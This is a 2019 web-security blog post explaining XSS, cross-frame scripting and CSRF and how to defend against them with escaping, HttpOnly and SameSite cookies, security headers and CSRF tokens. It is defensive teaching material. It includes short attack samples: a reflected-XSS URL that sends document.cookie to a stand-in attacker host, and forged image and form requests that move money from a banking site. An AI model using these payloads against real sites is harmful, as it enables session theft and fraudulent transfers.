<!DOCTYPE html><html lang="en"><head>
<link rel="dns-prefetch" href="//www.googletagmanager.com">
<link rel="dns-prefetch" href="//blog.larapulse.com">
<link rel="dns-prefetch" href="//larapulse.com">
<link rel="dns-prefetch" href="//api.larapulse.com">
<link rel="dns-prefetch" href="//github.com">
<link rel="dns-prefetch" href="//unshorten.it">
<link rel="dns-prefetch" href="//www.virustotal.com">
<link rel="dns-prefetch" href="//support.virustotal.com">
<link rel="dns-prefetch" href="//google.com?query=&lt;script&gt;new">
<link rel="dns-prefetch" href="//attackerurl.org">
<link rel="dns-prefetch" href="//example.com">
<link rel="dns-prefetch" href="//yourbanking.com">
<link rel="dns-prefetch" href="//&quot">
<link rel="dns-prefetch" href="//medium.com">
<link rel="dns-prefetch" href="//www.quora.com">
<link rel="dns-prefetch" href="//www.sjoerdlangkemper.nl">
<link rel="dns-prefetch" href="//www.checkmarx.com">
<link rel="dns-prefetch" href="//blog.codinghorror.com">
<link rel="dns-prefetch" href="//www.owasp.org">
<link rel="dns-prefetch" href="//security.stackexchange.com">
<link rel="dns-prefetch" href="//podgornyy.rocks">
<link rel="dns-prefetch" href="//louisbarranqueiro.github.io">
<link rel="dns-prefetch" href="//www.youtube.com">
<link rel="dns-prefetch" href="//www.instagram.com">
<link rel="dns-prefetch" href="//www.facebook.com">
<link rel="dns-prefetch" href="//www.linkedin.com">
<link rel="dns-prefetch" href="//twitter.com">
<link rel="dns-prefetch" href="//t.me"><script async src=https://www.googletagmanager.com/gtag/js?id=UA-122807654-1></script><script> window.dataLayer = window.dataLayer || []; function gtag(){ dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'UA-122807654-2'); </script><title>Prevent XSS and CSRF attacks on your website - Security | Larapulse Technology Blog</title><meta charset=UTF-8><meta name=robots content="index,follow"><meta name=viewport content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=yes"><meta name=keywords content="larapulse,technology,blog,article,security,xss,csrf,browser,attack,web,hacking,xfs,https,cookies,website,svg,cors"><meta name=description content="Two of the most common attacks against web sites and web application are XSS (Cross-site Scripting) and CSRF (Cross-Site Request Forgery). Both kind of attacks are exploited regulary and even big companies have been vulnerable to them."><meta name=subject content="Prevent XSS and CSRF attacks on your website - Security | Larapulse Technology Blog"><meta name=author content="Sergey Podgorny"><meta name=publisher content="Larapulse Technology"><meta name=language content="en_GB"><meta name=copyright content="Larapulse Technology"><meta name=format-detection content="telephone=no"><meta name=topic content="Prevent XSS and CSRF attacks on your website"><meta name=page-topic content="Prevent XSS and CSRF attacks on your website"><meta name=designer content="Louis Barranqueiro"><meta name=owner content="Sergey Podgornyy, sergey.podgornyy@yahoo.de"><meta name=url content="/"><meta name=identifier-url content="/"><meta name=pagename content="Prevent XSS and CSRF attacks on your website - Security | Larapulse Technology Blog"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=medium content="blog"><meta name=pageKey content="blog::article.show.33"><meta name=google-site-verification content="3WYVb1kIZ6bM3SSFHxn5vjD9YgSr11qmrilWNnEJtX8"><meta name=msapplication-TileImage content="/static/images/logo_400x400.jpg"><meta name=msapplication-TileColor content="#F55338"><meta name=twitter:card content="summary"><meta name=twitter:title content="Prevent XSS and CSRF attacks on your website - Security | Larapulse Technology Blog"><meta name=twitter:description content="Two of the most common attacks against web sites and web application are XSS (Cross-site Scripting) and CSRF (Cross-Site Request Forgery). Both kind of attacks are exploited regulary and even big companies have been vulnerable to them."><meta name=twitter:image content="/files/original/images/06/74/06744400bde2e3890f99048581fa56d62b13cc74.png"><meta name=twitter:site content="@LarapulseT"><meta property="fb:app_id" content="321394058628025"><meta property="og:title" content="Prevent XSS and CSRF attacks on your website"><meta property="og:url" content="/security/prevent-xss-csrf-attacks"><meta property="og:locale" content="en_GB"><meta property="og:description" content="Two of the most common attacks against web sites and web application are XSS (Cross-site Scripting) and CSRF (Cross-Site Request Forgery). Both kind of attacks are exploited regulary and even big companies have been vulnerable to them."><meta property="og:site_name" content="Larapulse Technology Blog"><meta property="og:type" content="article"><meta property="og:image" content="/files/original/images/06/74/06744400bde2e3890f99048581fa56d62b13cc74.png"><meta property="og:image:url" content="/files/original/images/06/74/06744400bde2e3890f99048581fa56d62b13cc74.png"><meta property="og:image:secure_url" content="/files/original/images/06/74/06744400bde2e3890f99048581fa56d62b13cc74.png"><meta property="og:image:type" content="image/png"><meta property="og:image" content="/files/original/images/5b/09/5b096c209ac2fd8027a4968a704dcba5a7627431.png"><meta property="og:image:url" content="/files/original/images/5b/09/5b096c209ac2fd8027a4968a704dcba5a7627431.png"><meta property="og:image:secure_url" content="/files/original/images/5b/09/5b096c209ac2fd8027a4968a704dcba5a7627431.png"><meta property="og:image:type" content="image/png"><meta property="article:published_time" content="2019-03-23T23:31:28+00:00"><meta property="article:modified_time" content="2019-03-23T23:05:08+00:00"><meta property="article:author" content="Sergey Podgorny"><meta property="article:section" content="Security"><meta property="article:tag" content=""><meta property="profile:first_name" content="Sergey"><meta property="profile:last_name" content="Podgorny"><meta property="profile:username" content="sergey.podgornyy"><meta http-equiv="Content-type" content="text/html; charset=UTF-8"><meta http-equiv="Content-language" content="en_GB"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><link rel="icon" href="/static/images/favicon.ico" ><link rel="shortcut icon" href="/static/images/favicon.ico" ><link rel="icon" href="/static/images/logo_192x192.jpg" sizes="192x192" ><link rel="apple-touch-icon" href="/static/images/logo_180x180.jpg" sizes="180x180" ><link rel="apple-touch-icon" href="/static/images/logo_152x152.jpg" sizes="152x152" ><link rel="apple-touch-icon" href="/static/images/logo_120x120.jpg" sizes="120x120" ><link rel="apple-touch-icon" href="/static/images/logo_76x76.jpg" sizes="76x76" ><link rel="apple-touch-icon" href="/static/images/logo_57x57.jpg" sizes="57x57" ><link rel="index" href="/" title="Larapulse Technology" ><link rel="help" href="/faq" title="FAQ" ><link rel="publisher" href="/" ><link rel="image_src" href="/files/original/images/06/74/06744400bde2e3890f99048581fa56d62b13cc74.png" ><link rel="canonical" href="/security/prevent-xss-csrf-attacks" ><link rel="alternate" href="/feed/atom.xml" type=application/atom+xml title="Atom 0.3" ><link rel="alternate" href="/feed/rss.xml" type=application/rss+xml title="RSS" ><link media="all" type=text/css rel="stylesheet" href="/assets/main.4065552450.css"><style> .badge.chip-prevent-xss-csrf-attacks { background-color: #c66c5d; } @media only screen and (max-width: 479px) { .post-group .post.item .badge.chip-prevent-xss-csrf-attacks { border: 2px solid #c66c5d !important; background-color: #fff; padding: 3px 16px; } .post-group .post.item .badge.chip-prevent-xss-csrf-attacks a { color: #c66c5d !important; } } </style><!--[if lt IE 9]><script src=//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.4065552450.js></script><script src=//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.4065552450.js></script><![endif]--><script>var apiUrl = 'https://api.larapulse.com';</script>
<style>.page_speed_495421970{ display: block; } .page_speed_1194862484{ margin-top: 50px } .page_speed_1037205973{ margin-bottom: 0; display: none } .page_speed_1304406891{ display: none; } .page_speed_322911394{ top: -420px; display: none; }</style>
</head><body><div id="blog" class="page_speed_495421970"><header id="header" data-behavior="1"><i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i><h3 class="header-title"><a class="header-title-link" href="/">Larapulse Blog</a></h3><a class="header-right-picture" href="/#about"><img class="header-picture" src=/assets/logo_30x30.jpg width=30px height=30px></a></header><nav id="sidebar" data-behavior="1"><div class="sidebar-profile"><a href="/#about"><img class="sidebar-profile-picture" src=/assets/logo_90x90.jpg width=90px height=90px></a><span class="sidebar-profile-name">Larapulse Blog</span></div><ul class="sidebar-buttons"><li class="sidebar-button"><a class="sidebar-button-link " href="/"><i class="sidebar-button-icon fa fa-lg fa-home"></i><span class="sidebar-button-desc">Home</span></a></li><li class="sidebar-button"><a class="sidebar-button-link " href="/announcements"><i class="sidebar-button-icon fa fa-lg fa-bell"></i><span class="sidebar-button-desc">Announcements</span></a></li><li class="sidebar-button"><a class="sidebar-button-link " href="/#about"><i class="sidebar-button-icon fa fa-lg fa-question"></i><span class="sidebar-button-desc">About</span></a></li></ul><ul class="sidebar-buttons"><li class="sidebar-button"><a class="sidebar-button-link " href="/faq"><i class="sidebar-button-icon fa fa-lg fa-comments"></i><span class="sidebar-button-desc">FAQ</span></a></li><li class="sidebar-button"><a class="sidebar-button-link " href="https://github.com/larapulse" target="_blank"><i class="sidebar-button-icon fa fa-lg fa-github"></i><span class="sidebar-button-desc">GitHub</span></a></li></ul><ul class="sidebar-buttons"></ul></nav><div id="main" data-behavior="1"><section class="main-content-wrap"><article class="post article"><div class="post-header"><h1 class="post-title text-center"> Prevent XSS and CSRF attacks on your website </h1><div class="post-meta text-center"><p class="published-line"><time content="Sat, Mar 23, 2019 11:31 PM"> Mar 23, 2019 </time> by Sergey Podgorny</p><span class="badge chip chip-prevent-xss-csrf-attacks"><a href="/security"> Security </a></span><span class="badge complexity-badge complexity-4"> Complexity: Medium</span><span class="tags"><a href="#">#xss</a><a href="#">#csrf</a><a href="#">#browser</a><a href="#">#attack</a><a href="#">#web</a><a href="#">#security</a><a href="#">#hacking</a><a href="#">#xfs</a><a href="#">#https</a><a href="#">#cookies</a><a href="#">#website</a><a href="#">#svg</a><a href="#">#cors</a></span></div></div><br><div class="breadcrumb non-printable"><a href="/categories">All categories</a> &raquo; <a href="/security">Security</a> &raquo; <span class="inactive">Prevent XSS and CSRF attacks on your website</span></div><hr><div class="post-content printable" onload="prettyPrint();"><h2>What is XSS: Cross-site scripting?</h2><p>In case of XSS, the attacker makes the victim's browser execute a script (mostly JavaScript) that has been injected by the attacker while visiting a trusted web site. The attacker has several ways of injecting the JavaScript into a web site that the victim trusts.</p><p>XSS doesn't need an authenticated session and can be exploited when the vulnerable website doesn't do the basics of validating or escaping input.</p><p>When the server doesn't validate or escape input as a primary control, an attacker can send inputs via request parameters or any kind of client side input fields (which can be cookies, form fields or url params). These can be written back to screen, persisted in database or executed remotely.</p><p><strong><em>Be aware using shorten URLs as you don't know where they can lead!</em></strong> First check where the hidden link leads using <a href="https://unshorten.it/">unshorten.it</a>. After receiving the final link, check it out on the <a href="https://www.virustotal.com/gui/home/url">VirusTotal</a> website. It is also suggested to have it as a <a href="https://support.virustotal.com/hc/en-us/articles/115002700745-Browser-Extensions">browser extension</a>.</p><p><img src=/assets/fdd7a5ad433463bfa16a25a523693b43bcd41f94.png alt="Virustotal URL scan" ></p><h4>Reflected XSS (aka <em>Non-Persistent</em> or <em>Type II XSS</em>)</h4><p>Reflected attacks are those where the malicious script is reflected by a web server and then executed by the the web browser. In this type of attack a user is tricked into clicking a link, or filling in a form, that has the script hidden in it. This can be achieved by sending an email, or posting the link on a forum.</p><p>As the domain that the victim can see in the URL is well known and trusted, the victim won't expect any harm behind it. When this is submitted to the server it will be rejected and reflected back to the browser. Many servers will send the input back in text format so the browser can display the input that was rejected. <em>If this text is a valid script then the browser will execute it as it is coming from a trusted source.</em> The attacker could use the victim's CPU to calculate bitcoins in the browser or could steal the victim's cookie.</p><pre  class="line-numbers"><code>https://google.com?query=&lt;script&gt;new Image().src="http://attackerurl.org/storecookie?cookie="+document.cookie;&lt;/script&gt;</code></pre><p><img src=/assets/d2bf6754e90c9944a508cc47e3b303d9a65c30b0.png alt="Reflected XSS: Cross-site scripting" ></p><h4>Stored XSS (aka <em>Persistent</em> or <em>Type I XSS</em>)</h4><p>Besides injecting the script using query parameters, the attacker may also inject the script persistenly into a web site's storage. The storage can be in a database, in a web page component like a message forum, visitor log, comment field, or other element that goes to make up a page to deliver to a user. In case, a forum that doesn't validate the user's input, website could be compromissed by posting something that contains the malicious script. <em>The malicious script is delivered along with the normal web content and the client executes it.</em> Every user of the forum that reads the attacker's post will become a victim.</p><p><img src=/assets/cc78b0c3f9caf823730f3a4059f567084469782a.png alt="Stored XSS: Cross-site scripting" ></p><h3>What is XFS: Cross Frame Scripting?</h3><p>Cross-Frame Scripting (XFS) is an attack that combines malicious JavaScript with an iframe that loads a legitimate page in an effort to steal data from an unsuspecting user. This attack is usually only successful when combined with social engineering. An example would consist of an attacker convincing the user to navigate to a web page the attacker controls. The attacker's page then loads malicious JavaScript and an HTML iframe pointing to a legitimate site. Once the user enters credentials into the legitimate site within the iframe, the malicious JavaScript steals the keystrokes.</p><p>The <code>X-Frame-Options</code> HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <code>&lt;frame&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;embed&gt;</code> or <code>&lt;object&gt;</code>. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.</p><pre  class="line-numbers"><code>X-Frame-Options: deny
X-Frame-Options: sameorigin
X-Frame-Options: allow-from https://example.com/</code></pre><h3>JavaScript in image tags</h3><p>Directly injecting JavaScript code in the source attribute of <code>&lt;img&gt;</code> tag is no longer possible on modern browsers.</p><p>But SVG is an XML based vector graphic format, therefore it invokes the XML parser in the browser. Moreover, <code>&lt;script&gt;</code> tag is allowed in the SVG, so JavaScript can be embed directly into SVG.</p><p>Browsers that support SVG inside <code>&lt;img&gt;</code> tags do not support scripting inside the context. <strong>But you should not use SVG inside <code>&lt;embed&gt;</code> or <code>&lt;object&gt;</code> tags where scripting is supported by browsers!</strong></p><p><img src=/assets/dcdc2266e8a8dada6072376c4aee0a098930f138.png alt="SVG is evil for XSS because of script tag" ></p><p>Allowing SVG inside <code>&lt;img&gt;</code><strong>may</strong> be dangerous when:</p><ul><li>An XML parser is used to parse the SVG, whether it is inside the <code>&lt;img&gt;</code> or <code>&lt;object&gt;</code> tag. The parser is certainly tweaked with some parameters to ignore <code>&lt;script&gt;</code> tags in the <code>&lt;img&gt;</code> context. Yet, that is quite ugly, it is blacklisting a tag in a certain context. And blacklisting is poor security.</li><li><code>&lt;script&gt;</code> is not the only way to achieve execution context in SVG, there are also the <code>onmouseover</code> (and family) events present in SVG. This is again tricky to blacklist.</li><li>The XML parser in browsers did suffer from problems in the past, notable with XML comments around script blocks. SVG may present similar problems.</li><li>SVG has full support for XML namespaces. <code>xlink:href</code> is a completely valid construct in SVG and the browser inside the XML parser context will likely follow it.</li></ul><p>Therefore, SVG opens several possible vectors to achieve execution context. And moreover, it is a relatively new technology and therefore not well hardened.</p><h2>What is CSRF: Cross-site request forgery?</h2><p>In a CSRF attack, the attacker tries to force/trick you into making a request which you did not intend, making use of the existing victim's context, such as cookies. Every time you interact with website, its server checks the cookie you send with the request so it knows it's you.</p><p>The level of the attack is based upon the level of privileges that the victim possessed. Because attacker will use the authentication that has gained in the current session to do the malicious task. This is the reason why this attack termed as Session Riding too.</p><h4>Using a GET request (rare case)</h4><p>CSRF happens in authenticated sessions when the server trusts the user/browser. Let's consider an example when you are logged in into your banking site. An attacker can place a malicious link embedded in another link or zero byte image which can be like:</p><pre  class="line-numbers"><code class="language-html">&lt;img src=yourbanking.com/transfer.do?to_account={attackers_account}&amp;amt=2500&gt;</code></pre><p>Now, in the background transfer can happen though you clicked this link (of course, if your banking uses <code>GET</code> request for such actions without any confirmation). Depending on the vulnerable web site, using CSRF, attackers can also change your credentials or user profile properties.</p><h4>Using a POST request (common and most popular case)</h4><p>This attack requires the user to click the form button on hacker's website, then the malicious page could just as easily send the request by submitting the form.</p><pre  class="line-numbers"><code class="language-html">&lt;h1&gt;You Are a Winner!&lt;/h1&gt;
&lt;form action="http://yourbanking.com/api/account/transfer" method="post"&gt;
    &lt;input type=hidden name=to_account value="attacker_id" /&gt;
    &lt;input type=hidden name=amount value="1000000" /&gt;
    &lt;input type=submit value="Click me to get your reward" /&gt;
&lt;/form&gt;</code></pre><p><em>After submitting the form user could figure out what happened, but it could be too late to revert or discard these changes.</em></p><p><img src=/assets/96eb21cccee7aedd0dad195137d112b0194ec731.png alt="CSRF: Cross-site request forgery" ></p><p>Moreover, using SSL does not prevent a CSRF attack, because the malicious site can send an &quot;https://&quot; request. Typically, CSRF attacks are possible against web sites that use cookies for authentication, because browsers send all relevant cookies to the destination web site.</p><h3>Difference between XSS and CSRF</h3><p>Both these attacks seems to be very similar, as they are client-side attacks and doing quite similar things, enforcing some form of user activity (e.g. clicking a link or visiting a website).</p><p>In a <strong>cross-site scripting (XSS)</strong> attack, the attacker makes you involuntarily execute client-side code, most likely Javascript. In a <strong>cross-site request forgery (CSRF)</strong> attack, the attacker manipulates you to making a melicoius request to the server which you did not intend. This could be sending you a link that makes you involuntarily perform some action.</p><p>XSS is generally more powerful than CSRF because it usually allows the execution of arbitrary script code while CSRF is restricted to a particular action (e.g. changing the password). A successful XSS attack also effectively bypasses all anti-CSRF measures.</p><hr ><h2>Protect your website</h2><h3>Protect against XSS attack</h3><h4>Escape special characters, validate and sanitize inputs</h4><blockquote><p>Expect any untrusted data to be malicious. What's untrusted data? Anything that originates from outside the system and you don't have absolute control over so that includes form data, query strings, cookies, other request headers, data from other systems (i.e. from web services) and basically anything that you can't be 100% confident doesn't contain evil things.</p><p>Troy Hunt</p></blockquote><p><strong>Validating input</strong> is the process of ensuring an application is rendering the correct data and preventing malicious data from doing harm to the site, database, and users. Input validation is especially helpful and good at preventing XSS in forms, as it prevents a user from adding special characters into the fields, instead refusing the request.</p><p><strong>Sanitizing data</strong> is a strong defense, but should not be used alone to battle XSS attacks. Sanitizing user input is especially helpful on sites that allow HTML markup, to ensure data received can do no harm to users as well as your database by scrubbing the data clean of potentially harmful markup, changing unacceptable user input to an acceptable format.</p><p><strong>Escaping data</strong> means taking the data an application has received and ensuring it’s secure before rendering it for the end user. By escaping user input, key characters in the data received by a web page will be prevented from being interpreted in any malicious way. In essence, you're censoring the data your web page receives in a way that will disallow the characters – especially <code>&lt;</code> and <code>&gt;</code> characters – from being rendered, which otherwise could cause harm to the application and/or users. <em>If your page doesn’t allow users to add their own code to the page, a good rule of thumb is to then escape any and all HTML, URL, and JavaScript entities.</em></p><h4><code>HttpOnly</code> flag for cookies</h4><p>The purpose of the <code>HttpOnly</code> flag is to make the value of the cookie unavailable from JavaScript, so that it can not be stolen if there is a XSS vulnerability.</p><p>Any attempt to access the cookie from client script is strictly forbidden. Of course, this presumes you have:</p><ul><li>A modern web browser</li><li>A browser that actually implements <code>HttpOnly</code> correctly</li></ul><p>The good news is that most modern browsers do support the <code>HttpOnly</code> flag. Regardless, <code>HttpOnly</code> cookies are a great idea, and properly implemented, make common XSS attacks much harder to pull off.</p><p><code>HttpOnly</code> cookies don't make you immune from XSS cookie theft, but they raise the bar considerably. Anyway, a &quot;set it and forget it&quot; setting is pretty secure as all modern browsers implemented client-side <code>HttpOnly</code> cookie security correctly.</p><h4>Security headers</h4><p>The HTTP <code>Content-Security-Policy</code> response header allows web site administrators to control resources the user agent is allowed to load for a given page. With a few exceptions, policies mostly involve specifying server origins and script endpoints. This helps guard against cross-site scripting attacks (XSS).</p><pre  class="line-numbers"><code>Content-Security-Policy: default-src https:; script-src https: 'unsafe-eval' 'unsafe-inline'; style-src https: 'unsafe-inline'; img-src https: data:; font-src https: data:; report-uri /csp-report</code></pre><p>The <code>X-XSS-Protection</code> header is designed to enable the cross-site scripting (XSS) filter built into modern web browsers. This is usually enabled by default, but using it will enforce it.</p><pre  class="line-numbers"><code>X-XSS-Protection: 1; mode=block</code></pre><p>A 0 value disables the XSS Filter. A 1 value enables the XSS Filter. If a cross-site scripting attack is detected, in order to stop the attack, the browser will sanitize the page.</p><p>A <code>1; mode=block</code> value also enables the XSS Filter and rather than sanitize the page, when an XSS attack is detected, the <strong>browser will prevent rendering of the page.</strong></p><hr ><h3>Protect against CSRF attack</h3><h4>Using CSRF-token</h4><p>Because of your session is active in the browser and it has your session id, CSRF attack can happend. This is the reason the most popular CSRF protection is having another server supplied unique token generated and appended in the request as a hidden value in every state changing form which is present on the web application. This token, called a <em>CSRF Token</em> or a <em>Synchronizer Token</em>. This unique token is not something which is known to the browser like session id.</p><p>Instead of putting the anti-CSRF token in the cookie, the server needs to put it as a hidden parameter in a form. For every request involving some sensitive action, the browser will send this token also along with the request and the server, before performing the action, would verify if the token is the one that it had sent to the browser or not. This additional validation at server will make sure that the attacker manipulated link.</p><p>This protects the form against CSRF attacks, because an attacker has no way of performing this sensitive action on behalf of the user, as forging a request will also need to guess the anti-CSRF token. Unless an attacker won't successfully trick a victim into sending a valid request or somehow finds out the random anti-CSRF token itself.</p><p><strong><em>This token should be invalidated after some time and after the user logs out. The token have to be unique per action and have to be valid only once. Never share tokens via URLs.</em></strong></p><h4>Using<code>Same-site</code> attribute for cookies</h4><p>CSRF attacks are only possible since Cookies are always sent with any requests that are sent to a particular origin (domain and path), which is related to that Cookie. Due to the nature of a CSRF attack, a flag can be set against a Cookie, tuning it into a same-site Cookie. A same-site Cookie is a Cookie which can only be sent, if the request is being made from the same origin that is related to the Cookie being sent. The Cookie and the page from where the request is being made, are considered to have the same origin if the protocol, port (if applicable) and host is the same for both.</p><p>When another site tries to request something from the web application, the cookie is not sent. This effectively makes CSRF impossible, because an attacker can not use a user's session from his site anymore.</p><p>There are two possible values for the same-site attribute:</p><ul><li><code>Strict</code>: the cookie is withheld with any cross-site usage. Even when the user follows a link to another website the cookie is not sent.</li><li><code>Lax</code>: some cross-site usage is allowed. Specifically, if the request is a GET request and the request is top-level. Top-level means that the URL in the address bar changes because of this navigation. This is not the case for iframes, images or XMLHttpRequests.</li></ul><table><thead><tr><th>request type</th><th>html code example</th><th>cookie type</th></tr></thead><tbody><tr><td>link</td><td><code>&lt;a href="..."&gt;</code></td><td>normal, lax</td></tr><tr><td>prerender</td><td><code>&lt;link rel="prerender" href="..."&gt;</code></td><td>normal, lax</td></tr><tr><td>form GET</td><td><code>&lt;form action="..."&gt;</code></td><td>normal, lax</td></tr><tr><td>form POST</td><td><code>&lt;form method="post" action="..."&gt;</code></td><td>normal</td></tr><tr><td>iframe</td><td><code>&lt;iframe src=...&gt;</code></td><td>normal</td></tr><tr><td>image</td><td><code>&lt;img src=...&gt;</code></td><td>normal</td></tr><tr><td>AJAX</td><td><code>fetch('...')</code> (JavaScript)</td><td>normal</td></tr></tbody></table><p>This table shows what cookies are sent with cross-origin requests. As you can see cookies without a same-site attribute (indicated by &quot;normal&quot;) are always sent. <strong><code>Strict</code> cookies are never sent. <code>Lax</code> cookies are only send with a top-level get request.</strong></p><p>As you would expect <em>strict</em> mode gives better security, but breaks some functionality. Links to protected resources won't work from other sites. Even if you are logged in and have access to some resource, your strict cookies won't be sent when coming from another site. With <em>lax</em> mode, this still works, while providing decent security by blocking cross-site post requests.</p><p>The same-site attribute is a good method to protect against CSRF attacks, because it seems to the attacker as though you are no longer logged in to the website under attack.</p><h4>Using <code>Referer</code>, <code>Origin</code>, <code>Host</code> and <code>X-Requested-With</code> headers</h4><p><code>X-Requested-With: XMLHttpRequest</code> HTTP header can prevent CSRF attacks because this header cannot be added to the AJAX request cross domain without the consent of the server via CORS. Without CORS it is not possible to add <code>X-Requested-With</code> to a cross domain XHR request. Only the following headers are allowed cross domain:</p><ul><li><code>Accept</code></li><li><code>Accept-Language</code></li><li><code>Content-Language</code></li><li><code>Last-Event-ID</code></li><li><code>Content-Type</code></li></ul><p><code>Referer</code> header tells server from where the request has originated. If the request is coming from unauthorized domain, then <code>Referer</code> header will contain that value and server can simply reject that request.</p><p><strong><em>These headers are great to additional check against CSRF attack, but do not rely only on them.</em></strong></p><h5>Misunderstanding the <em>Same Origin Policy (aka SOP)</em> and what <em>Cross-origin resource sharing (aka CORS)</em> brings to the table</h5><p>All the SOP does, is prevent the response from being read by another domain (aka origin). This is irrelevant to whether a CSRF attack is successful or not. The only time the SOP comes into play with CSRF is to prevent any token from being read by a different domain.</p><p>CORS does not increase security, it simply allows some exceptions to take place. Some browsers with partial CORS support allow cross site XHR requests (e.g. IE 10 and earlier), however they do not allow custom headers to be appended. In CORS supported browsers the <code>Origin</code> header cannot be set, preventing an attacker from spoofing this.</p><p>All of the above has nothing to do with forged requests coming directly from an attacker. Remember, the attacker needs to use the victim's browser for their attack. They need the browser to automatically send its cookies. This cannot be achieved by a direct <code>curl</code> request as this would only be authenticating the attacker in this type of attack scenario (the category known as &quot;client-side attacks&quot;).</p><hr class="default-separator page_speed_1194862484"><h3>TL;DR: Conclusion</h3><p>Both attacks have in common that they are client-side attacks and need some action of the end user, such as clicking on a link or visiting a web site. XSS executes a malicious script in your browser, CSRF sends a malicious request on your behalf.</p><hr><div class="resources collapsable-block non-printable"><p class="collapsable"><i class="fa fa-arrow-circle-right arrow"></i><strong>Resources</strong><i class="fa fa-fw fa-info-circle info"><span class="tooltip-box">Click to expand/shrink</span></i></p><ol class="page_speed_1037205973"><li><i class="fa fa-fw fa-file-text link-type-icon"></i><a href="https://medium.com/@l4mp1/difference-between-xss-and-csrf-attacks-ff29e5abcd33" target="_blank" rel="nofollow">Difference between XSS and CSRF attacks </a></li><li><i class="fa fa-fw fa-file-text link-type-icon"></i><a href="https://www.quora.com/What-is-the-difference-between-XSS-and-CSRF-from-their-execution-perspective" target="_blank" rel="nofollow">What is the difference between XSS and CSRF from their execution perspective? </a></li><li><i class="fa fa-fw fa-file-text link-type-icon"></i><a href="https://www.sjoerdlangkemper.nl/2016/04/14/preventing-csrf-with-samesite-cookie-attribute/" target="_blank" rel="nofollow">Preventing CSRF with the same-site cookie attribute </a></li><li><i class="fa fa-fw fa-file-text link-type-icon"></i><a href="https://www.checkmarx.com/2017/10/09/3-ways-prevent-xss/" target="_blank" rel="nofollow">3 Ways to Prevent XSS </a></li><li><i class="fa fa-fw fa-file-text link-type-icon"></i><a href="https://blog.codinghorror.com/protecting-your-cookies-httponly/" target="_blank" rel="nofollow">Protecting Your Cookies: HttpOnly </a></li><li><i class="fa fa-fw fa-file-text link-type-icon"></i><a href="https://www.owasp.org/index.php/Cross_Frame_Scripting" target="_blank" rel="nofollow">XFS: Cross Frame Scripting | OWASP</a></li><li><i class="fa fa-fw fa-file-text link-type-icon"></i><a href="https://security.stackexchange.com/questions/135513/what-could-an-img-src-xss-do/135636#135636" target="_blank" rel="nofollow">SVG script in image tag | StackExchange</a></li><li><i class="fa fa-fw fa-file-text link-type-icon"></i><a href="https://security.stackexchange.com/questions/97825/is-cors-helping-in-anyway-against-cross-site-forgery/97938#97938" target="_blank" rel="nofollow">Is CORS helping in anyway against Cross-Site Forgery? | StackExchange</a></li></ol></div></div><div class="post-meta post-footer"><span class="post-footer-tags tags"><i class="fa fa-fw fa-tags"></i><a href="#">#xss</a><a href="#">#csrf</a><a href="#">#browser</a><a href="#">#attack</a><a href="#">#web</a><a href="#">#security</a><a href="#">#hacking</a><a href="#">#xfs</a><a href="#">#https</a><a href="#">#cookies</a><a href="#">#website</a><a href="#">#svg</a><a href="#">#cors</a></span><div class="author"></div><div class="post-actions-wrap non-printable"><nav><ul class="post-actions post-action-nav"><li class="post-action"><a class="post-action-btn btn btn--default tooltip--top" href="/security/prevent-mitm-attacks" data-tooltip="Prevent MITM attacks on your website" ><i class="fa fa-angle-left"></i><span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span></a></li><li class="post-action"><a class="post-action-btn btn btn--default tooltip--top" href="/security/sql-injection" data-tooltip="SQL injection as one of the biggest vulnerabilities for your data" ><span class="hide-xs hide-sm text-small icon-mr">NEXT</span><i class="fa fa-angle-right"></i></a></li></ul></nav><ul class="post-actions post-action-share"><li class="post-action"><a class="post-shares post-action-btn btn btn--default" target="_blank" href="//plus.google.com/share?url=/security/prevent-xss-csrf-attacks" ><i class="fa fa-google-plus"></i></a></li><li class="post-action"><a class="post-shares post-action-btn btn btn--default" target="_blank" href="//www.facebook.com/sharer/sharer.php?u=/security/prevent-xss-csrf-attacks&title=Prevent+XSS+and+CSRF+attacks+on+your+website" ><i class="fa fa-facebook-official"></i></a></li><li class="post-action"><a class="post-shares post-action-btn btn btn--default" target="_blank" href="//twitter.com/intent/tweet?text=Prevent XSS and CSRF attacks on your website&url=/security/prevent-xss-csrf-attacks&via=@LarapulseT" ><i class="fa fa-twitter"></i></a></li></ul></div><div id="bottom-bar" class="post-bottom-bar" data-behavior="1"><div class="post-actions-wrap non-printable"><nav><ul class="post-actions post-action-nav"><li class="post-action"><a class="post-action-btn btn btn--default tooltip--top" href="/security/prevent-mitm-attacks" data-tooltip="Prevent MITM attacks on your website" ><i class="fa fa-angle-left"></i><span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span></a></li><li class="post-action"><a class="post-action-btn btn btn--default tooltip--top" href="/security/sql-injection" data-tooltip="SQL injection as one of the biggest vulnerabilities for your data" ><span class="hide-xs hide-sm text-small icon-mr">NEXT</span><i class="fa fa-angle-right"></i></a></li></ul></nav><ul class="post-actions post-action-share"><li class="post-action"><a class="post-shares post-action-btn btn btn--default" target="_blank" href="//plus.google.com/share?url=/security/prevent-xss-csrf-attacks" ><i class="fa fa-google-plus"></i></a></li><li class="post-action"><a class="post-shares post-action-btn btn btn--default" target="_blank" href="//www.facebook.com/sharer/sharer.php?u=/security/prevent-xss-csrf-attacks&title=Prevent+XSS+and+CSRF+attacks+on+your+website" ><i class="fa fa-facebook-official"></i></a></li><li class="post-action"><a class="post-shares post-action-btn btn btn--default" target="_blank" href="//twitter.com/intent/tweet?text=Prevent XSS and CSRF attacks on your website&url=/security/prevent-xss-csrf-attacks&via=@LarapulseT" ><i class="fa fa-twitter"></i></a></li></ul></div></div></div></article><div class="back-top-wrapper non-printable"><div class="top-btn"><i class="arrow-up"></i></div></div></section><footer id="footer" class="main-content-wrap"><nav class="non-printable"><a href="/data-protection/privacy-policy">Privacy policy</a><a href="/data-protection/cookie-policy">Cookie policy</a></nav><span class="copyrights"> Copyrights &copy; 2025 <a href="https://podgornyy.rocks" target="_blank">Sergey Podgornyy</a>. All Rights Reserved. <br> Designed by <a 